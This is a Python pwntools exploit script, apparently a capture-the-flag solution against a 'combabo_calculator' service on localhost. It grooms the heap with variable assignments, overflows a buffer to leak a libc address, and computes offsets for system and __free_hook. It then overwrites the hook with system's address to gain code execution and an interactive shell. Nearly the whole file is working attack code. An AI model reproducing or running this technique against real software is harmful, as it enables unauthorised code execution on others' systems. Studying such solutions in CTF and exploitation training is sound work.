#!/usr/bin/env python
# -*- coding: UTF-8 -*-
# Auth0r : afang
# nice day mua! :P
# desc:

#lambs:
wait = lambda x: raw_input(x)

# imports

from pwn import *
import time
import os
import sys

elf = ""
libc = ""
env = ""
LOCAL = 1
context.log_level = "debug"

#p = process("./combabo_calculator", env={"LD_PRELOAD":"./combabo.so.6"})
p = remote("localhost", 9030)

p.recvuntil(">>> ")

#declare a var:

p.sendline('a="a"')
p.recvuntil(">>> ")
p.sendline("a=255")
p.recvuntil(">>> ")
p.sendline('c="' + "test1" + '"')
p.recvuntil(">>> ")
p.sendline('l="' + "test" + '"')
p.recvuntil(">>> ")
p.sendline('t4="' + "test" + '"')
p.recvuntil(">>> ")
p.sendline('s1="' + "test" + '"')
p.recvuntil(">>> ")
p.sendline('s2="' + "testn" + '"')
p.recvuntil(">>> ")
p.sendline('d="' + "test" + '"')
p.recvuntil(">>> ")
p.sendline('e="' + "test123" + '"')
p.recvuntil(">>> ")
p.sendline('i="' + "test456" + '"')
p.recvuntil(">>> ")
p.sendline('t1="' + "test" + '"')
p.recvuntil(">>> ")

''' fengshui.
for i in range(100):
    temp = 0xc0
    strer = "fck" + str(i) + "a"
    print strer
    p.sendline(strer + '="' + 'a' * (0xb0 - 1) + '"')
    p.recvuntil(">>> ")
    p.sendline(strer + '="' + 'a' * (0x100 - 1) + '"')
    p.recvuntil(">>> ")

    
for i in range(150):
    temp = 0xc0
    strerr = "go" + str(i) + 'b'
    print strerr
    p.sendline(strerr+ '="' + 'a' * (0xb0 - 1) + '"')
    p.recvuntil(">>> ")
    p.sendline(strerr+ '="' + 'a' * (0x100 - 1) + '"')
    p.recvuntil(">>> ")
'''

'''
p.sendline("d=255")
p.recvuntil(">>> ")

pay = payload + "a" * 3

p.sendline('d="' + pay + '"')
p.recvuntil(">>> ")
'''

#trigger realloc

p.sendline('m="' + "z" * 0xa0 + '"')
p.sendline('e="' + "a" * 0x90 + '"')
p.recvuntil(">>> ")

#overwrite here.

payload = p32(0xffffffff) * 3 + p32(0xffffffff) + p32(0xffffffff)*3 + p32(0xffffffff) + p32(0xffffffff) * 5 
pay = payload + p32(0xffffffff) + p32(0xffffffff)


p.sendline('d=255')
p.recvuntil(">>> ")
p.sendline('d="' + pay+ '"')
p.recvuntil(">>> ")

#leak libc.

p.sendline('e=""')
p.recvuntil(">>> ")
p.sendline("e")
data = p.recvuntil(">>> ")
data = p.recvuntil(">>> ")

print len(data)
libc_base = data[:4]
libc = u32(libc_base) - 0x1af700
print hex(libc)
wait("break")

system = libc + 0x3a920
malloc_hook = libc + 0x1b08b0
free_hook = libc + 0x1b08b0

#create another arbitrary write.

payload2 = payload + p32(0xffffffff) + p32(free_hook) + p32(free_hook) 
p.sendline('s1=255')
p.recvuntil(">>> ")
p.sendline('s1="' + payload2 + '"')
p.recvuntil(">>> ")
p.sendline("s2=255")
p.recvuntil(">>> ")
p.sendline('s2="' + p32(system) + '"')
p.recvuntil(">>> ")


p.interactive()
